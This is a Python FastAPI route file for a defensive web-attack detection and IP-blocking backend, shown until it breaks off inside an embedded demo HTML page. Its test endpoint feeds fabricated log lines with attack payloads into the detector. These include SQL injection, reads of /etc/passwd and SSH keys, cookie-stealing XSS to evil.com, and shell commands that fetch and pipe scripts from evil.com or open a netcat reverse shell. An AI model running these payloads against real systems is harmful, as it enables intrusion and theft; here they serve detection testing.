"""
FastAPI route definitions for the Cyber Defense Agent backend.
"""

import asyncio
import logging
from datetime import datetime
from typing import Any, Dict, List

from fastapi import APIRouter, HTTPException, Query, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse

from backend.api.models import (
    AttackResponse,
    BlockedIPResponse,
    BlockIPRequest,
    DefenseModeRequest,
    HealthResponse,
    StatsResponse,
    UnblockIPRequest,
    WhitelistRequest,
)
from backend.monitoring.storage import LogStorage, DefenseStorage
from backend.monitoring.metrics_collector import MetricsCollector

logger = logging.getLogger(__name__)

router = APIRouter()

# These are injected from main.py
_log_storage: LogStorage = None
_defense_storage: DefenseStorage = None
_defense_engine = None
_analyzer = None
_email_reporter = None
_metrics_collector = MetricsCollector()

# WebSocket connection manager
_ws_connections: List[WebSocket] = []


def init_routes(log_storage, defense_storage, defense_engine, analyzer, email_reporter=None):
    global _log_storage, _defense_storage, _defense_engine, _analyzer, _email_reporter
    _log_storage = log_storage
    _defense_storage = defense_storage
    _defense_engine = defense_engine
    _analyzer = analyzer
    _email_reporter = email_reporter


# ------------------------------------------------------------------
# Health
# ------------------------------------------------------------------

@router.get("/health", response_model=HealthResponse, tags=["health"])
async def health_check():
    ollama_status = "unknown"
    if _analyzer:
        health = _analyzer.check_ollama_health()
        ollama_status = "ready" if health.get("available") else "unavailable"

    db_status = "connected"
    try:
        if _log_storage:
            _log_storage.get_recent_attacks(limit=1)
    except Exception:
        db_status = "error"

    return {
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "services": {
            "database": db_status,
            "ollama": ollama_status,
            "defense_engine": "active" if _defense_engine else "unavailable",
        },
        "defense_mode": {
            "auto_block": _defense_engine._auto_block if _defense_engine else False,
            "dry_run": _defense_engine._dry_run if _defense_engine else True,
        },
    }


# ------------------------------------------------------------------
# Attacks
# ------------------------------------------------------------------

@router.get("/api/attacks/recent", tags=["attacks"])
async def get_recent_attacks(limit: int = Query(default=20, ge=1, le=200)):
    if not _log_storage:
        raise HTTPException(503, "Storage not initialised")
    attacks = _log_storage.get_recent_attacks(limit=limit)
    return {"attacks": attacks, "total": len(attacks)}


@router.get("/api/stats/attacks", response_model=StatsResponse, tags=["stats"])
async def get_attack_stats(days: int = Query(default=7, ge=1, le=90)):
    if not _log_storage:
        raise HTTPException(503, "Storage not initialised")
    return _log_storage.get_attack_stats(days=days)


# ------------------------------------------------------------------
# Defense
# ------------------------------------------------------------------

@router.get("/api/defense/blocked-ips", tags=["defense"])
async def get_blocked_ips():
    if not _defense_storage:
        raise HTTPException(503, "Storage not initialised")
    ips = _defense_storage.get_blocked_ips()
    return {"blocked_ips": ips, "total": len(ips)}


@router.post("/api/defense/block-ip", tags=["defense"])
async def block_ip(req: BlockIPRequest):
    if not _defense_engine:
        raise HTTPException(503, "Defense engine not initialised")
    result = _defense_engine.manual_block(req.ip, req.reason, req.duration)
    if not result["success"]:
        raise HTTPException(500, "IP block operation failed")
    return {
        "success": True,
        "message": f"IP {req.ip} blocked successfully",
        "unblock_time": result.get("unblock_at"),
    }


@router.post("/api/defense/unblock-ip", tags=["defense"])
async def unblock_ip(req: UnblockIPRequest):
    if not _defense_engine:
        raise HTTPException(503, "Defense engine not initialised")
    result = _defense_engine.manual_unblock(req.ip)
    return {
        "success": result["success"],
        "message": f"IP {req.ip} unblocked",
    }


@router.post("/api/defense/emergency-unblock", tags=["defense"])
async def emergency_unblock():
    if not _defense_engine:
        raise HTTPException(503, "Defense engine not initialised")
    result = _defense_engine.emergency_unblock_all()
    return result


@router.post("/api/defense/mode", tags=["defense"])
async def set_defense_mode(req: DefenseModeRequest):
    if not _defense_engine:
        raise HTTPException(503, "Defense engine not initialised")
    if req.auto_block is not None:
        _defense_engine.set_auto_block(req.auto_block)
    if req.dry_run is not None:
        _defense_engine.set_dry_run(req.dry_run)
    return {
        "auto_block": _defense_engine._auto_block,
        "dry_run": _defense_engine._dry_run,
    }


# ------------------------------------------------------------------
# Whitelist
# ------------------------------------------------------------------

@router.get("/api/whitelist", tags=["whitelist"])
async def get_whitelist():
    if not _defense_engine:
        raise HTTPException(503, "Defense engine not initialised")
    return {"whitelist": _defense_engine.whitelist.list_all()}


@router.post("/api/whitelist/add", tags=["whitelist"])
async def add_to_whitelist(req: WhitelistRequest):
    if not _defense_engine:
        raise HTTPException(503, "Defense engine not initialised")
    _defense_engine.whitelist.add(req.ip, req.reason)
    return {"success": True, "message": f"IP {req.ip} added to whitelist"}


@router.post("/api/whitelist/remove", tags=["whitelist"])
async def remove_from_whitelist(req: WhitelistRequest):
    if not _defense_engine:
        raise HTTPException(503, "Defense engine not initialised")
    _defense_engine.whitelist.remove(req.ip)
    return {"success": True, "message": f"IP {req.ip} removed from whitelist"}


# ------------------------------------------------------------------
# Metrics
# ------------------------------------------------------------------

@router.get("/api/metrics/system", tags=["metrics"])
async def system_metrics():
    return _metrics_collector.get_metrics()


# ------------------------------------------------------------------
# LLM / Analysis
# ------------------------------------------------------------------

@router.post("/api/analysis/analyze", tags=["analysis"])
async def analyze_attack(attack_data: Dict[str, Any], request_data: Dict[str, Any] = None):
    if not _analyzer:
        raise HTTPException(503, "LLM analyzer not initialised")
    result = _analyzer.analyze_attack(attack_data, request_data or {})
    return result


@router.get("/api/analysis/ollama-health", tags=["analysis"])
async def ollama_health():
    if not _analyzer:
        raise HTTPException(503, "LLM analyzer not initialised")
    return _analyzer.check_ollama_health()


# ------------------------------------------------------------------
# Vulnerability Scanner & Attack Simulator
# ------------------------------------------------------------------

@router.post("/api/scan/run", tags=["scanning"])
async def run_vulnerability_scan():
    try:
        from backend.scanning.vulnerability_scanner import VulnerabilityScanner
        scanner = VulnerabilityScanner(storage=_defense_storage)
        result = await scanner.run_scan()
        return result
    except Exception as exc:
        raise HTTPException(500, f"Scan failed: {exc}")


@router.get("/api/scan/results", tags=["scanning"])
async def get_scan_results():
    if not _defense_storage:
        raise HTTPException(503, "Storage not initialised")
    return {"results": _defense_storage.get_scan_results()}


@router.post("/api/simulate/attacks", tags=["scanning"])
async def simulate_attacks():
    try:
        from backend.scanning.attack_simulator import AttackSimulator
        sim = AttackSimulator()
        result = await sim.run_all()
        return result
    except Exception as exc:
        raise HTTPException(500, f"Simulation failed: {exc}")


# ------------------------------------------------------------------
# Test injection endpoint — directly processes fake log lines
# ------------------------------------------------------------------

@router.post("/api/test/inject", tags=["testing"])
async def inject_test_attacks():
    """Directly inject test attack log lines into the detection pipeline."""
    from backend.monitoring.log_parser import NginxLogParser
    from backend.detection.detection_engine import AttackDetectionEngine
    from backend.defense.defense_engine import DefenseEngine
    from backend.analysis.llm_analyzer import LLMAnalyzer
    from datetime import datetime
    import asyncio

    ts = datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")

    # Helper to build a log line
    def line(ip, method, path, status, size, ua, ref="-"):
        return f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"'

    CHROME  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
    FIREFOX = "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
    MOBILE  = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
    CURL    = "curl/7.68.0"

    test_lines = [
        # ── Normal traffic (should NOT be detected) ───────────────────────────
        line("5.5.5.5",   "GET",  "/",                          200, 4096,  CHROME),
        line("5.5.5.5",   "GET",  "/index.html",                200, 8192,  CHROME),
        line("5.5.5.5",   "GET",  "/about",                     200, 3200,  CHROME),
        line("5.5.5.5",   "GET",  "/products?category=shoes",   200, 5120,  CHROME),
        line("5.5.5.5",   "GET",  "/api/health",                200, 64,    CURL),
        line("6.6.6.6",   "POST", "/login",                     200, 256,   FIREFOX),   # successful login
        line("6.6.6.6",   "GET",  "/dashboard",                 200, 12288, FIREFOX),
        line("6.6.6.6",   "GET",  "/profile?id=42",             200, 2048,  FIREFOX),
        line("7.7.7.7",   "GET",  "/search?q=blue+jeans",       200, 3072,  MOBILE),
        line("7.7.7.7",   "GET",  "/images/logo.png",           200, 15360, MOBILE),
        line("7.7.7.7",   "GET",  "/static/app.js",             200, 51200, MOBILE),
        line("8.8.8.8",   "GET",  "/api/products?page=1",       200, 4096,  CHROME),
        line("8.8.8.8",   "GET",  "/api/products?page=2",       200, 4096,  CHROME),
        line("9.9.9.9",   "GET",  "/contact",                   200, 2048,  FIREFOX),
        line("9.9.9.9",   "POST", "/contact",                   302, 128,   FIREFOX),
        line("10.10.10.10","GET", "/blog/post-1",               200, 6144,  CHROME),
        line("10.10.10.10","GET", "/blog/post-2",               200, 7168,  CHROME),
        line("11.22.33.44","GET", "/favicon.ico",               200, 1024,  CHROME),
        line("11.22.33.44","GET", "/robots.txt",                200, 128,   CURL),
        line("12.34.56.78","GET", "/sitemap.xml",               200, 2048,  CHROME),
        # 404s and errors — normal, not attacks
        line("5.5.5.5",   "GET",  "/old-page",                  404, 512,   CHROME),
        line("6.6.6.6",   "GET",  "/missing-image.jpg",         404, 256,   FIREFOX),
        line("7.7.7.7",   "POST", "/api/comment",               500, 128,   MOBILE),

        # ── SQL Injection — multiple variants ─────────────────────────────────
        line("11.11.11.11","GET", "/login?user=' OR '1'='1--&pass=x",                    401, 512,  "sqlmap/1.7.8"),
        line("11.11.11.11","GET", "/login?user=admin' UNION SELECT username,password FROM users--", 401, 256, "sqlmap/1.7.8"),
        line("11.11.11.11","GET", "/search?q=1'; DROP TABLE users--",                    200, 256,  "sqlmap/1.7.8"),
        line("11.11.11.11","GET", "/api?id=1 AND SLEEP(5)--",                            200, 256,  "sqlmap/1.7.8"),
        line("11.11.11.11","GET", "/item?id=1 OR 1=1",                                   200, 512,  "sqlmap/1.7.8"),
        line("111.111.111.111","GET", "/login?user=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", 500, 256, CURL),
        line("111.111.111.111","GET", "/api/user?id=1 UNION SELECT null,table_name FROM information_schema.tables--", 200, 1024, CURL),
        line("222.222.222.222","GET", "/product?id=1; EXEC xp_cmdshell('whoami')--",     500, 128,  CURL),
        line("222.222.222.222","GET", "/search?q=' OR BENCHMARK(5000000,MD5(1))--",      200, 256,  CURL),

        # ── Brute Force — 8 attempts same IP ──────────────────────────────────
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        # Second brute force attacker targeting /admin
        line("123.123.123.123","POST", "/admin/login", 403, 256, "Hydra/9.4"),
        line("123.123.123.123","POST", "/admin/login", 403, 256, "Hydra/9.4"),
        line("123.123.123.123","POST", "/admin/login", 403, 256, "Hydra/9.4"),
        line("123.123.123.123","POST", "/admin/login", 403, 256, "Hydra/9.4"),
        line("123.123.123.123","POST", "/admin/login", 403, 256, "Hydra/9.4"),
        line("123.123.123.123","POST", "/admin/login", 403, 256, "Hydra/9.4"),
        # wp-login brute force
        line("234.234.234.234","POST", "/wp-login.php", 401, 256, "WPScan/3.8.22"),
        line("234.234.234.234","POST", "/wp-login.php", 401, 256, "WPScan/3.8.22"),
        line("234.234.234.234","POST", "/wp-login.php", 401, 256, "WPScan/3.8.22"),
        line("234.234.234.234","POST", "/wp-login.php", 401, 256, "WPScan/3.8.22"),
        line("234.234.234.234","POST", "/wp-login.php", 401, 256, "WPScan/3.8.22"),
        line("234.234.234.234","POST", "/wp-login.php", 401, 256, "WPScan/3.8.22"),

        # ── Path Traversal — multiple targets ─────────────────────────────────
        line("33.33.33.33","GET", "/files?file=../../../../etc/passwd",          200, 1024, CURL),
        line("33.33.33.33","GET", "/files?file=../../../../.ssh/id_rsa",         200, 512,  CURL),
        line("33.33.33.33","GET", "/download?path=..%2F..%2F..%2Fetc%2Fshadow", 200, 512,  CURL),
        line("33.33.33.33","GET", "/static?file=../../../../etc/hosts",          200, 256,  CURL),
        line("33.33.33.33","GET", "/view?f=../../../../proc/self/environ",       200, 2048, CURL),
        line("33.33.33.33","GET", "/img?src=../../../../var/www/html/.env",      200, 512,  CURL),
        line("133.133.133.133","GET", "/read?file=....//....//etc/passwd",       200, 1024, CURL),
        line("133.133.133.133","GET", "/load?path=%252e%252e%252fetc%252fpasswd",200, 1024, CURL),
        line("133.133.133.133","GET", "/file?name=C:\\Windows\\System32\\config\\SAM", 200, 512, CURL),

        # ── XSS — reflected, stored, DOM ──────────────────────────────────────
        line("44.44.44.44","GET", "/search?q=<script>alert(document.cookie)</script>",  200, 2048, CHROME),
        line("44.44.44.44","GET", "/search?q=<img src=x onerror=alert(1)>",             200, 2048, CHROME),
        line("44.44.44.44","GET", "/page?name=javascript:alert(document.cookie)",       200, 2048, CHROME),
        line("44.44.44.44","GET", "/comment?text=<svg onload=alert(1)>",                200, 2048, CHROME),
        line("44.44.44.44","GET", "/profile?bio=<script>fetch('http://evil.com?c='+document.cookie)</script>", 200, 2048, CHROME),
        line("144.144.144.144","GET", "/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E", 200, 2048, FIREFOX),
        line("144.144.144.144","GET", "/name?v=<iframe src=javascript:alert(1)>",       200, 2048, FIREFOX),
        line("144.144.144.144","GET", "/msg?t=<body onload=document.location='http://evil.com?'+document.cookie>", 200, 2048, FIREFOX),

        # ── Command Injection — various shells ────────────────────────────────
        line("55.55.55.55","GET", "/cmd?host=localhost;cat /etc/passwd",         200, 512,  CURL),
        line("55.55.55.55","GET", "/cmd?host=127.0.0.1|id",                     200, 256,  CURL),
        line("55.55.55.55","GET", "/run?cmd=/bin/bash -i",                       200, 256,  CURL),
        line("55.55.55.55","GET", "/exec?c=wget http://evil.com/shell.sh",       200, 256,  CURL),
        line("55.55.55.55","GET", "/ping?host=x;curl http://evil.com/c2|bash",   200, 256,  CURL),
        line("155.155.155.155","GET", "/diag?ip=$(cat /etc/passwd)",             200, 1024, CURL),
        line("155.155.155.155","GET", "/tool?cmd=`whoami`",                      200, 128,  CURL),
        line("155.155.155.155","GET", "/net?host=x && nc -e /bin/sh evil.com 4444", 200, 256, CURL),
        line("155.155.155.155","GET", "/run?x=x;python3 -c 'import socket,subprocess'", 200, 256, CURL),

        # ── Bot Scanners — various tools ──────────────────────────────────────
        line("66.66.66.66",   "GET", "/",                    200, 4096, "sqlmap/1.7.8"),
        line("77.77.77.77",   "GET", "/",                    200, 4096, "Nikto/2.1.6"),
        line("88.88.88.88",   "GET", "/",                    200, 4096, "masscan/1.0"),
        line("99.99.99.99",   "GET", "/admin",               200, 4096, "dirbuster/1.0"),
        line("100.100.100.100","GET","/wp-login.php",        200, 4096, "zgrab/0.x"),
        line("101.101.101.101","GET","/",                    200, 4096, "Nessus/10.0"),
        line("102.102.102.102","GET","/",                    200, 4096, "OpenVAS/9.0"),
        line("103.103.103.103","GET","/",                    200, 4096, "Metasploit/6.3"),
        line("104.104.104.104","GET","/",                    200, 4096, "python-requests/2.28"),
        line("105.105.105.105","GET","/",                    200, 4096, "libwww-perl/6.67"),
        line("106.106.106.106","GET","/",                    200, 4096, "WPScan/3.8.22"),
        line("107.107.107.107","GET","/",                    200, 4096, "Acunetix/14.0"),
        # Directory enumeration
        line("88.88.88.88",   "GET", "/admin",               404, 256,  "dirbuster/1.0"),
        line("88.88.88.88",   "GET", "/backup",              404, 256,  "dirbuster/1.0"),
        line("88.88.88.88",   "GET", "/.git/config",         404, 256,  "dirbuster/1.0"),
        line("88.88.88.88",   "GET", "/config.php",          404, 256,  "dirbuster/1.0"),
        line("88.88.88.88",   "GET", "/.env",                404, 256,  "dirbuster/1.0"),
    ]

    parser = NginxLogParser()
    engine = AttackDetectionEngine()
    analyzer = LLMAnalyzer()
    analyzer._available = False  # use fast fallback, don't wait for Ollama

    # Use the global defense engine so blocks are real and persistent
    defense = _defense_engine

    results = []
    normal_count = 0
    for line in test_lines:
        parsed = parser.parse(line)
        if not parsed:
            continue
        request_id = _log_storage.save_request(parsed)
        detections = engine.analyze_request(parsed)
        if detections:
            top = detections[0]
            _log_storage.mark_attack(request_id, top["attack_type"], top["severity"])
            defense_result = defense.execute_defense(top)
            blocked = defense_result.get("action") == "BLOCK_IP"
            if blocked:
                _log_storage.mark_attack(request_id, top["attack_type"], top["severity"], blocked=True)
            analysis = analyzer.analyze_attack(top, parsed)
            _defense_storage.save_ai_analysis(request_id, top["attack_type"], analysis)
            await broadcast_attack({
                "id": request_id,
                "timestamp": parsed.get("timestamp"),
                "ip": parsed.get("ip"),
                "method": parsed.get("method"),
                "path": parsed.get("path"),
                "status": parsed.get("status"),
                "user_agent": parsed.get("user_agent"),
                "attack_type": top["attack_type"],
                "severity": top["severity"],
                "blocked": blocked,
                "defense_action": defense_result.get("action"),
            })
            results.append({
                "ip": parsed["ip"],
                "attack_type": top["attack_type"],
                "severity": top["severity"],
                "blocked": blocked,
            })
        else:
            normal_count += 1

    return {
        "injected": len(test_lines),
        "normal_requests": normal_count,
        "detected": len(results),
        "attacks": results,
    }


# ------------------------------------------------------------------
# Chrome Extension API endpoints
# ------------------------------------------------------------------

@router.post("/api/extension/report", tags=["extension"])
async def extension_report(data: dict):
    """Receive scan reports from the Chrome extension."""
    with __import__("backend.monitoring.storage", fromlist=["get_connection"]).get_connection() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS extension_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT NOT NULL,
                url TEXT,
                risk_level TEXT,
                score INTEGER,
                is_https INTEGER,
                issues TEXT,
                action TEXT,
                scanned_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        import json as _json
        conn.execute("""
            INSERT INTO extension_scans (domain, url, risk_level, score, is_https, issues, action)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (
            data.get("domain", ""),
            data.get("url", ""),
            data.get("riskLevel", data.get("risk_level", "UNKNOWN")),
            data.get("score"),
            int(data.get("isHTTPS", data.get("is_https", False))),
            _json.dumps(data.get("issues", [])),
            data.get("action", "SCAN"),
        ))
    return {"success": True}


@router.get("/api/extension/scans", tags=["extension"])
async def get_extension_scans(limit: int = Query(default=50, ge=1, le=200)):
    """Get recent extension scan results for the dashboard."""
    import json as _json
    from backend.monitoring.storage import get_connection
    try:
        with get_connection() as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS extension_scans (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    domain TEXT NOT NULL,
                    url TEXT,
                    risk_level TEXT,
                    score INTEGER,
                    is_https INTEGER,
                    issues TEXT,
                    action TEXT,
                    scanned_at DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            rows = conn.execute(
                "SELECT * FROM extension_scans ORDER BY scanned_at DESC LIMIT ?", (limit,)
            ).fetchall()
        scans = []
        for r in rows:
            d = dict(r)
            if d.get("issues") and isinstance(d["issues"], str):
                try: d["issues"] = _json.loads(d["issues"])
                except: d["issues"] = []
            scans.append(d)
        return {"scans": scans, "total": len(scans)}
    except Exception as e:
        return {"scans": [], "total": 0}


@router.get("/api/extension/stats", tags=["extension"])
async def get_extension_stats():
    """Aggregated stats for the extension dashboard section."""
    import json as _json
    from backend.monitoring.storage import get_connection
    try:
        with get_connection() as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS extension_scans (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    domain TEXT NOT NULL,
                    url TEXT,
                    risk_level TEXT,
                    score INTEGER,
                    is_https INTEGER,
                    issues TEXT,
                    action TEXT,
                    scanned_at DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            total = conn.execute("SELECT COUNT(*) FROM extension_scans").fetchone()[0]
            by_risk = conn.execute(
                "SELECT risk_level, COUNT(*) as cnt FROM extension_scans GROUP BY risk_level"
            ).fetchall()
            blocked = conn.execute(
                "SELECT COUNT(*) FROM extension_scans WHERE action='BLOCKED'"
            ).fetchone()[0]
            unsafe_https = conn.execute(
                "SELECT COUNT(*) FROM extension_scans WHERE is_https=0"
            ).fetchone()[0]
            recent_domains = conn.execute(
                "SELECT DISTINCT domain, risk_level, score, scanned_at FROM extension_scans ORDER BY scanned_at DESC LIMIT 10"
            ).fetchall()
        return {
            "total_scans": total,
            "by_risk": {r["risk_level"]: r["cnt"] for r in by_risk if r["risk_level"]},
            "blocked_count": blocked,
            "unsafe_http_count": unsafe_https,
            "recent_domains": [dict(r) for r in recent_domains],
        }
    except Exception as e:
        return {"total_scans": 0, "by_risk": {}, "blocked_count": 0, "unsafe_http_count": 0, "recent_domains": []}


@router.post("/api/test/inject-custom", tags=["testing"])
async def inject_custom_attacks(payload: dict):
    """Inject custom log lines for individual attack type testing."""
    from backend.monitoring.log_parser import NginxLogParser
    from backend.detection.detection_engine import AttackDetectionEngine
    from backend.analysis.llm_analyzer import LLMAnalyzer

    lines = payload.get("lines", [])
    parser = NginxLogParser()
    engine = AttackDetectionEngine()
    analyzer = LLMAnalyzer()
    analyzer._available = False

    results = []
    for line in lines:
        parsed = parser.parse(line)
        if not parsed:
            continue
        request_id = _log_storage.save_request(parsed)
        detections = engine.analyze_request(parsed)
        if detections:
            top = detections[0]
            _log_storage.mark_attack(request_id, top["attack_type"], top["severity"])
            defense_result = _defense_engine.execute_defense(top)
            blocked = defense_result.get("action") == "BLOCK_IP"
            if blocked:
                _log_storage.mark_attack(request_id, top["attack_type"], top["severity"], blocked=True)
            analysis = analyzer.analyze_attack(top, parsed)
            _defense_storage.save_ai_analysis(request_id, top["attack_type"], analysis)
            await broadcast_attack({
                "id": request_id,
                "timestamp": parsed.get("timestamp"),
                "ip": parsed.get("ip"),
                "method": parsed.get("method"),
                "path": parsed.get("path"),
                "status": parsed.get("status"),
                "user_agent": parsed.get("user_agent"),
                "attack_type": top["attack_type"],
                "severity": top["severity"],
                "blocked": blocked,
                "defense_action": defense_result.get("action"),
            })
            results.append({
                "ip": parsed["ip"],
                "attack_type": top["attack_type"],
                "severity": top["severity"],
                "blocked": blocked,
            })

    return {"injected": len(lines), "detected": len(results), "attacks": results}


# ------------------------------------------------------------------
# Demo Attack Endpoint — real client IP, used by the demo page
# ------------------------------------------------------------------

_DEMO_ATTACK_PATHS = {
    "SQL_INJECTION": "/login?user={payload}",
    "COMMAND_INJECTION": "/cmd?host={payload}",
    "XSS": "/search?q={payload}",
    "PATH_TRAVERSAL": "/files?file={payload}",
    "BRUTE_FORCE": "/login",
}

_DEMO_PAYLOADS = {
    "SQL_INJECTION": "' OR '1'='1--",
    "COMMAND_INJECTION": "localhost;cat /etc/passwd",
    "XSS": "<script>alert(document.cookie)</script>",
    "PATH_TRAVERSAL": "../../../../etc/passwd",
    "BRUTE_FORCE": "",
}


def _get_client_ip(request: Request) -> str:
    """Extract real client IP, respecting X-Forwarded-For."""
    forwarded = request.headers.get("X-Forwarded-For", "")
    if forwarded:
        return forwarded.split(",")[0].strip()
    real_ip = request.headers.get("X-Real-IP", "")
    if real_ip:
        return real_ip
    return request.client.host if request.client else "0.0.0.0"


@router.post("/api/demo/attack", tags=["demo"])
async def demo_attack(body: Dict[str, Any], request: Request):
    """
    Perform a demo attack from the caller's real IP.

    The caller's IP is extracted from the HTTP request, fed through the
    full detection + defense pipeline, and the result is returned.
    This is the endpoint the interactive demo page (GET /demo) uses.
    """
    from backend.monitoring.log_parser import NginxLogParser
    from backend.detection.detection_engine import AttackDetectionEngine
    from backend.analysis.llm_analyzer import LLMAnalyzer
    from datetime import datetime

    attack_type = body.get("attack_type", "SQL_INJECTION")
    custom_payload = body.get("payload", "")

    client_ip = _get_client_ip(request)

    # Build a plausible NGINX log line for the chosen attack
    payload = custom_payload or _DEMO_PAYLOADS.get(attack_type, "test")
    path_tpl = _DEMO_ATTACK_PATHS.get(attack_type, "/test?q={payload}")
    path = path_tpl.format(payload=payload)
    ts = datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")

    brute_lines = []
    if attack_type == "BRUTE_FORCE":
        # Send 7 fake failed logins
        brute_lines = [
            f'{client_ip} - - [{ts}] "POST /login HTTP/1.1" 401 256 "-" "demo-browser/1.0"'
            for _ in range(7)
        ]
    else:
        brute_lines = [
            f'{client_ip} - - [{ts}] "GET {path} HTTP/1.1" 200 512 "-" "demo-browser/1.0"'
        ]

    parser = NginxLogParser()
    engine = AttackDetectionEngine()
    analyzer = LLMAnalyzer()
    analyzer._available = False  # fast fallback for demo

    detections_summary = []
    for log_line in brute_lines:
        parsed = parser.parse(log_line)
        if not parsed:
            continue
        request_id = _log_storage.save_request(parsed)
        detections = engine.analyze_request(parsed)
        if detections:
            top = detections[0]
            _log_storage.mark_attack(request_id, top["attack_type"], top["severity"])
            defense_result = _defense_engine.execute_defense(top)
            blocked = defense_result.get("action") in ("BLOCK_IP", "ALREADY_BLOCKED")
            if blocked:
                _log_storage.mark_attack(request_id, top["attack_type"], top["severity"], blocked=True)

            analysis = analyzer.analyze_attack(top, parsed)
            _defense_storage.save_ai_analysis(request_id, top["attack_type"], analysis)

            # Send email report if configured
            if _email_reporter:
                _email_reporter.send_attack_report(top, parsed, analysis)

            await broadcast_attack({
                "id": request_id,
                "timestamp": parsed.get("timestamp"),
                "ip": client_ip,
                "method": parsed.get("method"),
                "path": parsed.get("path"),
                "status": parsed.get("status"),
                "user_agent": parsed.get("user_agent"),
                "attack_type": top["attack_type"],
                "severity": top["severity"],
                "blocked": blocked,
                "defense_action": defense_result.get("action"),
            })

            detections_summary.append({
                "attack_type": top["attack_type"],
                "severity": top["severity"],
                "blocked": blocked,
                "analysis": {
                    "explanation": analysis.get("explanation", ""),
                    "impact": analysis.get("impact", ""),
                    "mitigation": analysis.get("mitigation", []),
                },
            })

    if detections_summary:
        return {
            "detected": True,
            "attacker_ip": client_ip,
            "attack_type": attack_type,
            "detections": detections_summary,
            "message": f"Attack detected! IP {client_ip} has been blocked.",
        }
    return {
        "detected": False,
        "attacker_ip": client_ip,
        "attack_type": attack_type,
        "detections": [],
        "message": "No attack patterns matched. Try a different payload.",
    }


@router.post("/api/demo/report", tags=["demo"])
async def demo_report(body: Dict[str, Any], request: Request):
    """
    Receive a raw request report from the vulnerable test app middleware.

    The test app forwards every incoming request here so the detection
    engine can analyse real traffic going to the vulnerable app.
    """
    from backend.monitoring.log_parser import NginxLogParser
    from backend.detection.detection_engine import AttackDetectionEngine
    from backend.analysis.llm_analyzer import LLMAnalyzer
    from datetime import datetime

    ip = body.get("ip") or _get_client_ip(request)
    method = body.get("method", "GET")
    path = body.get("path", "/")
    body_text = body.get("body", "")
    user_agent = body.get("user_agent", "")

    # Combine path and body for scanning (catches POST body SQL injection too)
    scan_target = path
    if body_text:
        scan_target = f"{path} {body_text}"

    ts = datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")
    log_line = (
        f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" 200 512 "-" "{user_agent}"'
    )

    parser = NginxLogParser()
    parsed = parser.parse(log_line)
    if not parsed:
        return {"detected": False}

    # Override path with combined target for detection
    parsed["path"] = scan_target
    parsed["body"] = body_text

    from backend.detection.detection_engine import AttackDetectionEngine
    engine = AttackDetectionEngine()
    analyzer = LLMAnalyzer()
    analyzer._available = False

    request_id = _log_storage.save_request(parsed)
    detections = engine.analyze_request(parsed)

    if not detections:
        return {"detected": False, "ip": ip}

    top = detections[0]
    _log_storage.mark_attack(request_id, top["attack_type"], top["severity"])
    defense_result = _defense_engine.execute_defense(top)
    blocked = defense_result.get("action") in ("BLOCK_IP", "ALREADY_BLOCKED")
    if blocked:
        _log_storage.mark_attack(request_id, top["attack_type"], top["severity"], blocked=True)

    analysis = analyzer.analyze_attack(top, parsed)
    _defense_storage.save_ai_analysis(request_id, top["attack_type"], analysis)

    if _email_reporter:
        _email_reporter.send_attack_report(top, parsed, analysis)

    await broadcast_attack({
        "id": request_id,
        "timestamp": parsed.get("timestamp"),
        "ip": ip,
        "method": method,
        "path": path,
        "status": 200,
        "user_agent": user_agent,
        "attack_type": top["attack_type"],
        "severity": top["severity"],
        "blocked": blocked,
        "defense_action": defense_result.get("action"),
    })

    return {
        "detected": True,
        "ip": ip,
        "attack_type": top["attack_type"],
        "severity": top["severity"],
        "blocked": blocked,
    }


# ------------------------------------------------------------------
# Demo HTML Page — served at GET /demo
# ------------------------------------------------------------------

_DEMO_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🛡️ Cyber Defense Live Demo</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: #0f172a;
      color: #e2e8f0;
      min-height: 100vh;
    }
    .header {
      background: linear-gradient(135deg, #dc2626 0%, #7c3aed 100%);
      padding: 28px 24px;
      text-align: center;
    }
    .header h1 { font-size: clamp(1.4rem, 4vw, 2rem); font-weight: 800; color: #fff; }
    .header p  { color: #fca5a5; margin-top: 6px; font-size: 0.9rem; }
    .badge {
      display: inline-block;
      background: rgba(255,255,255,0.15);
      border: 1px solid rgba(255,255,255,0.3);
      border-radius: 20px;
      padding: 4px 14px;
      font-size: 0.75rem;
      color: #fff;
      margin-top: 10px;
    }
    .container { max-width: 860px; margin: 0 auto; padding: 24px 16px; }

